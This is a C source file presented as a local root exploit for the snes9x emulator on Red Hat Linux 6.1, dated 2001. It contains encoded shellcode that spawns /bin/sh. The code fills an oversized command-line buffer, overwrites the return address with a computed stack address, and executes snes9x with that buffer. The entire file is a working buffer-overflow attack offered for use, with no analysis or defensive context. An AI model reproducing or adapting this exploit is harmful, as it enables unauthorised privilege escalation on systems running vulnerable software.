/*
 * snes9x local root exploit
 *
 * Tested on snes9x 1.3.7 + Redhat Linux 6.1
 * 2001/10/16 Creation morinosato
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFSIZE 4089

char shellcode[]=
"\xeb\x29\x5e\x29\xc9\x89\xf3\x89\x5e\x08"
"\xb1\x07\x80\x03\x20\x43\xe0\xfa\x29\xc0"
"\x88\x46\x07\x89\x46\x0c\xb0\x0b\x87\xf3"
"\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0"
"\x40\xcd\x80\xe8\xd2\xff\xff\xff\x0f\x42"
"\x49\x4e\x0f\x53\x48";

main(int argc, char **argv)
{
	char buf[BUFSIZE + 1];
	char writeaddr[8];
	char *arg[] = {"./snes9x",buf,0};
	int i;
	unsigned int addr;

	addr = (0xc0000000 - 4)
		 - (sizeof("./snes9x"))
		 - (sizeof(buf));

	*(unsigned int *)&writeaddr[0] = addr;
	memset(buf, 'A', BUFSIZE);

	for (i = 0; i < strlen(shellcode); i++)
		buf[i] = shellcode[i];

	buf[83] = writeaddr[0];
	buf[84] = writeaddr[1];
	buf[85] = writeaddr[2];
	buf[86] = writeaddr[3];

	buf[BUFSIZE] = 0;

	printf("jmp to [0x%08x]\n",writeaddr);
	execve(arg[0], arg, 0);
}
